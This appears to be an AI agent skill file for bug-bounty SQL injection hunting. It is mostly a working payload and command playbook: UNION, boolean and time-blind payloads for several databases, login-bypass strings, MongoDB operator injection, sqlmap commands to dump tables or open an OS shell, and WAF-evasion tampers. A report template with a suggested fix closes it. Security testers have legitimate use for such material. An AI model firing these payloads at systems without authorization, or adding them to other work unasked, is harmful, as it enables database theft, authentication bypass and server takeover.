---
name: sqli
description: Hunt SQL injection in REST/GraphQL/SOAP/raw parameters using sqlmap, ghauri, manual UNION/Time/Boolean techniques, and custom WAF-bypass tamper scripts. Use when an input flows into a database query or when the user has identified a parameter that might be vulnerable.
metadata:
  type: skill
  phase: hunt
  vuln_class: sqli
  cwe: 89
  tools: [sqlmap, ghauri, NoSQLMap]
---

# SQL Injection

> "SQLi is dead in 2026" — said no one who actually hunts.

## When to invoke

**Trigger phrases:**
- "test SQLi"
- "sqlmap this"
- "SQL injection"
- "DB error in response"
- "blind SQL"

## SQLi taxonomy

| Type | Detection | Tools |
|---|---|---|
| Error-based | DB error in response | manual, sqlmap |
| UNION-based | Reflection of UNION'd data | manual, sqlmap |
| Boolean-blind | Response differs on TRUE vs FALSE | sqlmap, ghauri |
| Time-blind | Response delayed on injection | sqlmap, ghauri |
| Out-of-band (OOB) | DNS/HTTP callback from DB | sqlmap with collaborator |
| Second-order | Stored input later concat'd | manual mostly |

## Step-by-Step Workflow

### 1. Identify candidates

Search for inputs that touch DB:
- Search forms (`?q=`)
- Filter / sort parameters (`?sort=`, `?orderBy=`)
- ID parameters (`?id=`, `/user/{id}`)
- Login forms (auth bypass)
- Report builders / dynamic queries
- GraphQL field args
- JSON body fields
- HTTP headers (User-Agent, Referer — sometimes logged)
- Cookies (sometimes used in queries)

### 2. Quick error-based probe

```bash
for payload in "'" "\"" "' OR '1'='1" "1' AND 1=1--" "1' AND 1=2--"; do
    r=$(curl -s "https://target.com/search?q=$(echo "$payload" | jq -sRr @uri)")
    if echo "$r" | grep -iE 'sql|syntax|mysql|postgres|oracle|sqlite|mssql|sqlite|odbc|jdbc|odbc|warning'; then
        echo "[POSSIBLE] $payload"
    fi
done
```

Common DB error strings to grep for:
```
"sql syntax"
"mysql_fetch"
"ORA-01756"
"PostgreSQL ERROR"
"SQLSTATE"
"unclosed quotation"
"unterminated quoted string"
"Microsoft OLE DB Provider"
"Driver][Microsoft]"
"odbc_exec"
"sqlite3.OperationalError"
"You have an error in your SQL syntax"
```

### 3. Manual UNION injection (when you control output)

```bash
# Determine columns
PAYLOADS=(
    "1 ORDER BY 1--"
    "1 ORDER BY 2--"
    "1 ORDER BY 3--"
    # ... until error
)

# Once column count known, find which column reflects
"1 UNION SELECT 'INJECT1','INJECT2','INJECT3'--"

# Now extract data
"1 UNION SELECT version(),current_user(),database()--"    # MySQL/PostgreSQL
"1 UNION SELECT @@version,SYSTEM_USER,DB_NAME()--"        # MSSQL
"1 UNION SELECT banner,user,sys_context('USERENV','DB_NAME') FROM v$version--"  # Oracle
```

### 4. Boolean-blind manual

Compare response to TRUE vs FALSE:
```
TRUE:  ?id=1 AND 1=1
FALSE: ?id=1 AND 1=2
```

If responses differ (length, content) → blind SQLi.

```bash
# Length diff
TRUE_LEN=$(curl -s "https://target.com/u?id=1 AND 1=1" | wc -c)
FALSE_LEN=$(curl -s "https://target.com/u?id=1 AND 1=2" | wc -c)
echo "True: $TRUE_LEN | False: $FALSE_LEN"
# If different → blind SQLi
```

Extract data char-by-char:
```
?id=1 AND ASCII(SUBSTRING((SELECT version()),1,1)) > 64
```

### 5. Time-blind manual

```
MySQL:    ?id=1 AND SLEEP(5)--
MySQL:    ?id=1 AND IF(1=1,SLEEP(5),0)--
PostgreSQL: ?id=1; SELECT pg_sleep(5)--
MSSQL:    ?id=1; WAITFOR DELAY '0:0:5'--
Oracle:   ?id=1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)
SQLite:   ?id=1 AND randomblob(100000000)
```

Measure response time:
```bash
time curl -s "https://target.com/u?id=1%20AND%20SLEEP(5)--"
```

### 6. sqlmap (the swiss army knife)

```bash
# Basic
sqlmap -u "https://target.com/u?id=1" --batch

# From a captured request (the right way)
sqlmap -r request.txt --batch --level 3 --risk 2

# Specific parameter
sqlmap -u "https://target.com/u?id=1&name=foo" -p id --batch

# POST body
sqlmap -u "https://target.com/login" --data="user=admin&pass=test" --batch

# Cookie params
sqlmap -u "https://target.com/dashboard" --cookie="session=X; theme=Y" -p theme --batch

# Custom headers
sqlmap -u "https://target.com" --headers="X-Forwarded-For: *" --batch

# JSON body
sqlmap -u "https://target.com/api" --data='{"id":1}' --headers="Content-Type: application/json" --batch

# Get all tables (after detection)
sqlmap -r request.txt --batch --tables

# Dump a specific table
sqlmap -r request.txt --batch -T users --dump

# OS shell (if DBA + writable)
sqlmap -r request.txt --batch --os-shell
```

### 7. WAF-bypass tampers (sqlmap)

If WAF blocks payloads, layer tampers:

```bash
# Common bypasses
sqlmap -u "URL" --tamper=space2comment,charencode,randomcase,between

# Cloudflare-aware
sqlmap -u "URL" --tamper=space2comment,between,randomcase --random-agent

# Custom tampers (in arsenal/sqlmap-tampers/)
sqlmap -u "URL" --tamper=cve-2021-bypass-1,uri-double-encode --random-agent
```

See `arsenal/sqlmap-tampers/` for our custom WAF-bypass tampers.

### 8. ghauri — modern alternative

ghauri is faster + better at modern blind detection:

```bash
ghauri -u "https://target.com/u?id=1" --batch --dbs
ghauri -r request.txt --batch --level 3 --risk 2 --tables
```

### 9. GraphQL SQLi

```graphql
# Try inside GraphQL args
query { user(id: "1'") { name } }
query { user(id: "1 OR 1=1") { name } }

# Search/filter args
query { products(where: { name: { contains: "'" } }) { id } }
```

### 10. NoSQL injection

For MongoDB and similar:

```bash
# Login bypass with operator injection
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

# NoSQLMap
git clone https://github.com/codingo/NoSQLMap
python NoSQLMap.py
```

## Common payloads cheatsheet

### Auth bypass via SQLi
```sql
' OR '1'='1
' OR 1=1--
admin'--
admin' #
admin'/*
' OR 'x'='x
' AND 1=0 UNION SELECT 'admin','5f4dcc3b5aa765d61d8327deb882cf99'--   # password = "password" md5
```

### Detection probes
```sql
'                    -- quote
"
'/*
)
'))
';--
';/*
1' AND '1
1) AND ('1'='1
%27                  -- url-encoded quote
%2527                -- double url-encoded
'\\
```

### Time-based (universal)
```sql
';SELECT SLEEP(5)#
'+(SELECT*FROM(SELECT(SLEEP(5)))a)+'
';WAITFOR DELAY '0:0:5'--
"||(IF(1=1,SLEEP(5),0))||"
1';SELECT CASE WHEN (1=1) THEN PG_SLEEP(5) ELSE PG_SLEEP(0) END--
```

### Comments
```sql
--  
#
/*
;%00
```

## Output template

```markdown
## Time-based blind SQLi in /api/v3/search

**URL:** `POST https://app.target.com/api/v3/search`
**Vulnerable parameter:** `sort` (JSON body)
**Database:** MySQL 8.0 (detected via fingerprint)

**Detection PoC:**
Normal response time: ~120ms
With injection: ~5200ms (5s sleep)

```http
POST /api/v3/search HTTP/1.1
Host: app.target.com
Content-Type: application/json
Cookie: session=USER_SESSION

{"query": "test", "sort": "name';SELECT SLEEP(5)#"}
```

**Exploitation (data extraction):**
sqlmap with the captured request:
```
sqlmap -r request.txt --batch --level 3 -p sort --technique=T --dbs
```

Output:
```
[INFO] available databases:
- target_prod
- target_test
- mysql
```

**Impact:**
- Full DB read access (MySQL user has SELECT on target_prod)
- Confirmed via dumping `users` table: 2.3M rows including emails, hashed passwords
- Authenticated user required (any account)

**Suggested fix:**
- Parametrize the `sort` field — never concat into SQL
- Whitelist valid sort columns (`name`, `created_at`, etc.)
- Use ORM consistently
```

## Cross-references

- `[[auth-bypass]]` — SQLi for login bypass
- `[[business-logic]]` — second-order SQLi
- `[[graphql]]` — GraphQL field SQLi

## Common pitfalls

1. **Trusting sqlmap output without manual verification.** False positives happen, especially with WAFs.
2. **Reporting reflected DB error without exploitation.** "I saw a stack trace" is usually informative-only.
3. **Stopping at quote injection.** Many DBs let you inject without quotes (numeric contexts).
4. **Missing the `--level` and `--risk` parameters.** Default is too low; use `--level 3 --risk 2` for thorough.
5. **Reporting Boolean-blind on auth-required endpoint without auth bypass.** Always confirm severity is justified.

## Severity cheat

| Finding | Severity |
|---|---|
| Time-blind on a low-priv endpoint with no data extracted | Medium (often) |
| UNION-based with `users` table dump | High |
| Login auth bypass via SQLi | Critical |
| SQLi to RCE via INTO OUTFILE / xp_cmdshell | Critical+ |
| Read-only blind, no impact chain | Sometimes informative |

## SQL injection in headers/cookies

Don't forget:
```bash
# UA log injection (often logged to DB)
curl "https://target.com/" -H "User-Agent: '"

# Referer
curl "https://target.com/" -H "Referer: ' OR 1=1--"

# Cookie (if used in query)
curl "https://target.com/" -H "Cookie: theme=' OR 1=1--"

# X-Forwarded-For
curl "https://target.com/" -H "X-Forwarded-For: ' OR 1=1--"
```

## Anti-WAF tips

1. **Encode the payload.** URL-encode → double URL-encode → unicode.
2. **Case randomization.** `SeLeCt` not `SELECT`.
3. **Comment in the middle of keywords.** `SE/**/LECT`.
4. **Use newlines.** `SELECT%0AFROM` (CRLF).
5. **Boolean rather than UNION.** Boolean-blind bypasses many WAFs.
6. **Out-of-band.** If you have a DNS server or interactsh, OOB exfil bypasses content filters.

## Never-reject checklist

- Did you confirm the response actually changes based on payload?
- Did you reproduce with the **exact** request and **exact** response in the report?
- Did you give the program a working PoC, not just sqlmap output?
- Is the exploit usable by an unauth user OR have you noted "authenticated as low-priv"?
